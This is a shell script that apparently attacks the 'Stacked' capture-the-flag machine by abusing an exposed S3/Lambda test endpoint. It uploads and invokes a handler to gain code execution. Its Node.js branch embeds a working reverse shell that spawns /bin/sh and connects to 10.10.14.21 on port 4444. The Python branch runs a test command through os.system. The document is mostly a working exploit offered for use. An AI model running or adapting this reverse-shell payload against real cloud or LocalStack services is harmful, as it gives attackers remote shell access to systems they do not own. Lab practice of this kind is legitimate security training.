#!/bin/sh

ENDPOINT=http://s3-testing.stacked.htb
#ENDPOINT=http://localhost:4566
BUCKET=oal
PACKAGE=ping
ZIPFILE=$PACKAGE.zip
FUNCTION="my_func"
RUNTIME="python3.8"
HANDLER="my_handler"

print_env() {
  echo =====================
  echo Endpoint = $ENDPOINT
  echo Bucket   = $BUCKET
  echo Runtime  = $RUNTIME
  echo =====================
  echo
}

# clean
clean() {
  aws --endpoint-url=$ENDPOINT s3 rm s3://$BUCKET --recursive
  aws --endpoint-url=$ENDPOINT s3 rb s3://$BUCKET
  aws --endpoint-url=$ENDPOINT lambda delete-function --function-name "$FUNCTION"
}

gen_nodejs() {
  FILENAME="$PACKAGE.js"

  cat <<EOF > $FILENAME
exports.$HANDLER =  async function(event, context) {
    console.log('hello');
    return /a/;
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.14.21", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
}
EOF
}

gen_python() {
  FILENAME="$PACKAGE.py"

  cat <<EOF > $FILENAME
import os

def $HANDLER(event, context):
    os.system('echo 123 > /tmp/oal123.txt')

    return {'message': 'Hello from oal'}
EOF
}

exploit() {
  # make bucket
  aws --endpoint-url=$ENDPOINT s3 mb s3://$BUCKET

  case $RUNTIME in
    nodejs)
        gen_nodejs
        ;;
    python* | python3.8 | python3.9)
	gen_python
	;;
    *)
	# RUNTIME="python"
	gen_python
	;;
  esac
	
  echo "Generated file: $FILENAME"

  # zip code
  zip $ZIPFILE $FILENAME

  # upload to S3
  aws --endpoint-url=$ENDPOINT s3 cp $ZIPFILE s3://$BUCKET

  # create lambda function
  aws --endpoint-url=$ENDPOINT lambda create-function --function-name "$FUNCTION" --handler $PACKAGE.$HANDLER --runtime $RUNTIME --code S3Bucket=$BUCKET,S3Key=$ZIPFILE --role test

  # invoke lambda function
  aws --endpoint-url=$ENDPOINT lambda invoke --function-name "$FUNCTION" lambda.out
}

print_env
exploit
clean
